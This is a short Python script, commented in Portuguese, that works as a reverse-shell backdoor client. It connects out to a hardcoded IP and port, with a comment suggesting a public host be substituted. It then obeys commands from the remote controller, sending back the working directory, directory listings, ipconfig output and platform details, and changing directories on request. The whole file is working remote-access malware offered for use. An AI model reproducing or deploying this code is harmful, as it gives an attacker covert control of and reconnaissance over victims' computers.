
import socket
import os, base64

IP = "192.168.100.9" #se caso for público coloca seu host/dns
PORT = 2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
print("Conectado!")

while True:
    command = s.recv(3000)
    command = command.decode()
    print(command)

    if command == "pwd":
        file = os.getcwd()
        file = str(file)
        file = file.encode()
        s.send(file)
    
    elif command == "dir":
        file = os.popen('dir')
        filed = file.read()
        filed = str(filed)
        filed = filed.encode()
        s.send(filed)

    elif command == "ipconfig":
        file = os.popen('ipconfig')
        filed = file.read()
        filed = str(filed)
        filed = filed.encode()
        s.send(filed)

    elif command == "cd ..":
        local = ".."
        file = os.chdir(local)
        print("")

    elif command == "info":
        import platform
        info = platform.uname()
        info = str(info)
        info = info.encode()
        s.send(info)

    elif command == "cd":
        try:
            print("")
            local = s.recv(50000)
            local = local.decode()
            file = os.getcwd()
            junto = file+'\\'+local
            path = os.chdir(junto)
        except:
            print("Error!")

    elif command == "dirchange":
        try:
            file = s.recv(40000)
            file = file.decode()
            print("local recebido",file)
            os.chdir(file)
            print("Local Trocado com Sucesso!")
        except:
            print("error")